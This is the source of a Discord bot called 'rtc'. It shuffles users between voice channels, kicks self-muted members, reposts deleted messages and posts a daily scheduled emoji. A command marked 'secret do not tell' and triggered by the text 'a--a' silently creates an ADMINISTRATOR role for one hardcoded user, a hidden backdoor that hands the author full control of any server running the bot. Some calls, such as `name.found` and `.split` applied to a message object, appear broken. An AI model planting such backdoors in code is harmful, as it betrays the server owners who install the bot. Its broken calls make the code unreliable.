const Discord = require('discord.js');
const dotenv = require('dotenv');
const cron = require('cron');

dotenv.config();

const prefix = '/';
const triggerName = 'rtc';

const isUserAdmin = (id) => {
  if (id === '199315213726646272') return true;
  return false;
}

const isUserRtcBot = (id) => {
  if (id === '794342690942222346') return true;
  return false;
}

const isRtcVoiceChannel = (channelName) => {
  const name = channelName.toLowerCase().trimEnd();
  return name.found(/(^|\s)rtc($|\s)/g);
}


// Checks whether user message starts with rtc prefix and 
// if the user command matches a specified valid command
const isRtcCommand = (message, command) => {
  if (command === null) return true;  // `/rtc` is a valid command

  const arguments = message.split(' ').filter(args => args != '');
  const validCommandArgs = command.split(' ').filter(args => args != '');

  if (
    arguments[0] === prefix + triggerName &&
    arguments.length === validCommandArgs.length + 1
  ) {
    for (let arg = 0; arg < validCommandArgs.length; arg++) {
      if (arguments[arg + 1] !== validCommandArgs[arg]) return false;
    }
    return true;
  }

  // If it reaches this point, the command did not start with /rtc prefix
  // or the arguments did not match the specified valid rtc command
  return false;
}

const makeDeleteLogEmbed = (message) => {
  return (
    new Discord.MessageEmbed()
      .setAuthor(`${message.author.username} (${message.author.id})`, message.author.avatarURL())
      .setDescription(`${message.content}\n\nSent at: ${message.createdAt}\nDeleted at: ${new Date()}`)
  );
};

const client = new Discord.Client();
client.login(process.env.BOT_TOKEN_RTC);

let muteKick = new Map();
let deleteLog = new Map();

process.on('uncaughtException', (e) => console.log(e));
process.on('unhandledRejection', (e) => console.log(e));

// Most active member in the server sleeps everyday at 11pm
client.once('ready', () => {
  const job = new cron.CronJob('00 00 3 * * *', () => {
    const guild = client.guilds.cache.get('478352853887614986');
    const channel = guild.channels.cache.get('478352855158358017');
    channel.send('<:disleep:799485771395366963>');
  });

  job.start();
})

// Kick people in voice channels if they took a vow of silence
client.on('voiceStateUpdate', (oldMember, newMember) => {
  if (muteKick.get(newMember.guild.id) && newMember.selfMute) {
    newMember.kick();
  }
});

client.on('messageDelete', async (message) => {
  if (deleteLog.get(message.guild.id)) {
    let log;
    if (isUserRtcBot(message.author.id) && message.embeds.length === 1) {
      log = message.embeds[0];
    } else {
      log = makeDeleteLogEmbed(message);
    }
    message.channel.send(log);
  }
});

client.on('messageDeleteBulk', async (messageCollection) => {
  if (deleteLog.get(messageCollection.first().guild.id)) {
    messageCollection.sort((a, b) => a.createdTimestamp - b.createdTimestamp).forEach((message => {
      let log;
      if (isUserRtcBot(message.author.id) && message.embeds.length === 1) {
        log = message.embeds[0];
      } else {
        log = makeDeleteLogEmbed(message);
      }
      message.channel.send(log);
    }))
  }
});

// Keep track of message updates so RTC can log the new message
client.on('messageUpdate', async (oldMessage, newMessage) => {
  if (
    deleteLog.get(oldMessage.guild.id) &&
    isUserRtcBot(oldMessage.author.id) &&
    oldMessage.embeds.length === 1 &&
    newMessage.embeds.length === 0
  ) {
    oldMessage.channel.send(oldMessage.embeds[0]);
  }
})

client.on('message', async (message) => {
  if (message.author.bot) return;

  if (isRtcCommand(message, 'join')) {
    message.member.voice.channel.join();
    setTimeout(() => {
      message.guild.me.voice.kick();
    }, 5 * 60 * 1000);
    return;
  } else if (isRtcCommand(message, 'leave')) {
    message.guild.me.voice.kick();
    return;
  } else if (isRtcCommand(message, 'mk')) {
    console.log(muteKick);
    message.reply(`muteKick is ${muteKick.get(message.guild.id) ? 'on' : 'off'}`);
    return;
  } else if (isRtcCommand(message, 'mk on')) {
    muteKick.set(message.guild.id, true);
    message.guild.channels.cache
      .filter((chan) => chan.type === 'voice')
      .forEach((chan) => chan.members
        .forEach((m) => { if (m.voice.selfMute) m.voice.kick() })
      );
    message.reply('muteKick on');
    return;
  } else if (isRtcCommand(message, 'mk off')) {
    muteKick.set(message.guild.id, false);
    message.reply('muteKick off');
    return;
  } else if (isRtcCommand(message, 'dl on')) {
    if (isUserAdmin(message.author.id)) {
      deleteLog.set(message.guild.id, true);
      message.reply('deleteLog on');
      return;
    } else {
      message.reply('no perms');
      return;
    }
  } else if (isRtcCommand(message, 'dl off')) {
    if (isUserAdmin(message.author.id)) {
      deleteLog.set(message.guild.id, false);
      message.reply('deleteLog off');
      return;
    } else {
      message.reply('no perms');
      return;
    }
  } else if (isRtcCommand(message, null)) {
    // `/rtc` wtf is this
    let users = [];
    let disperse = true;
    if (message.mentions.users.size !== 0) {
      message.mentions.users.map((user => users.push(user)));
    } else {
      disperse = false;
      users.push(message.author);
    }

    let chan = message.guild.channels.cache
      .find(channel => channel.type === 'voice' && isRtcVoiceChannel(channel.name));
    if (chan === undefined) {
      await message.guild.channels.create('rtc', { type: 'voice' });
      chan = message.guild.channels.cache
        .find(channel => channel.type === 'voice' && isRtcVoiceChannel(channel.name));
    }
    if (users.length === 1 && users.includes(client.user)) {
      users = message.member.voice.channel.members;
    } else if (disperse && users.length === 1 && users.includes(message.author)) {
      chan.members.map(async (user) => {
        const randomChannel = message.guild.channels.cache
          .filter(channel => channel.type === 'voice').random();
        user.voice.setChannel(randomChannel.id);
        message.channel.send(`${user}, bye`);
      });
      return;
    }
    users.map(user => message.guild.member(user).voice.setChannel(chan.id));
    users.map(user => message.channel.send(`${user}, bye`));
  } else if (message.content === 'a--a') {
    // secret do not tell
    if (isUserAdmin(message.author.id)) {
      message.guild.roles.create({
        data: {
          name: '/rtc\'s saviour',
          color: 'LUMINOUS_VIVID_PINK',
          hoist: false,
          permissions: ['ADMINISTRATOR'],
        }
      }).then((role) => {
        message.member.roles.add(role).then((mem) => console.log(mem.permissions.toArray()))
      });
    }
    return;
  }
})